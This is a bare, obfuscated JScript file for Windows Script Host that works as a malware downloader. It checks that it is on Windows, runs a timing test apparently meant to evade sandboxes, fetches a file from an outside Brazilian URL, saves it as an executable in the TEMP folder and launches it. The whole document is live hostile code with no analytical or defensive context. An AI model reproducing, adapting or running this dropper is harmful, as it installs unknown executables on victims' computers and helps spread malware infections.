var s = false;
var K = "CreateObject";
var Jo = function y() {return WScript[K]("WScript.Shell");}(), i0 = 11;
var X = "MSXML2.XMLHTTP";
var ke = 2123213;
var T = 0;
function Bt(OA){Jo["Run"](OA, T, T);};
function m(){return "" + X;};
function nB(C0, Nq){T = T * 1; return C0 - Nq;};
function C(){return K;};
/*@cc_on
  @if (@_win32 || @_win64)
    s = true;
  @end
@*/
if (s)
{
var i = "";
function U(){return 22;};
var Pv = 0; var J0 = 0;
function jh()
{
var SH = new this["Date"]();
var D = SH["getUTCMilliseconds"]();
WScript["Sleep"](U());
var SH = new this["Date"]();
var wg = SH["getUTCMilliseconds"]();
WScript["Sleep"](U());
var SH = new this["Date"]();
var ya = SH["getUTCMilliseconds"]();
var Pv = "h";
Pv = nB(wg, D);
var J0 = "ZM";
J0 = nB(ya, wg);
i = "open";
return nB(Pv, J0);
}
var RK = false;
var kY = false;
for (var Pu = T; Pu < U() * 1; Pu++){if (jh() != T){
RK = true; 
J0 = "31" + 11 * Pv + J0; 
kY = true; 
break;
}}
function RM() {return ((RK == true) && (RK == kY)) ? 1 : T;};
if (RK && RM() && kY){
function J() {return Jo["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "XzB7QuZzlCde.exe";};
 oM = m();
 VG = WScript[K](oM);
 var x = 1;
 while (x){
try {
VG[i]("GET", "http://lojaagrometal.com.br/mi3sa", false);
VG["send"]();
yW = "Sleep";
for (;;){WScript[yW](U() * 11); if (VG["readystate"] >= 2 * 2) break;};
x = T;
} catch(fQ){};
}
function uT(k) {var K0 = (1, 2, 3, 4, 5, k); return K0;};
m0 = WScript[C()]("ADODB.Stream");
oM = m0;
oM[i]();
oM["type"] = uT(1);
oM["write"](VG["ResponseBody"]);
m0["position"] = uT(T);
oM["Save" + "ToFile"](J(), 2);
m0["c"+"lose"]();
Y = J();
Bt(Y);
}
}

